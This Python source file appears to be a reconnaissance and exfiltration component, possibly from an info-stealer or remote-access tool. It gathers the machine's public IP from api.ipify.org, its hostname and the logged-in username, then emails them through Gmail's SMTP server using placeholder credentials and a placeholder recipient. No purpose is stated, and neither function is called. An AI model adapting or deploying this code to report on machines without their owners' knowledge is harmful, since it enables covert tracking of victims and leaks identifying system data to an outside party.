import socket
import os
import requests
import smtplib
from email.message import EmailMessage


email_address = "test"
email_password = "test"


# Get IP Address and Get Machine Name
def get_ip_address():
    url = "https://api.ipify.org"
    response = requests.get(url)
    ip_address = response.text
    hostname = socket.gethostname()
    username = os.environ.get("USERNAME")
    return """Ip Address: {0} 
                 \nHostname: {1} 
                 \nUsername: {2}""".format(
        ip_address, hostname, username
    )


# Get IP Address and Get Machine Name


def send_email(Message, Subject):
    msg = EmailMessage()
    msg["Subject"] = Subject
    msg["From"] = email_address
    msg["To"] = "test"
    info = get_ip_address()
    msg.set_content(info)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(email_address, email_password)
        smtp.send_message(msg)

# Get Machine Name
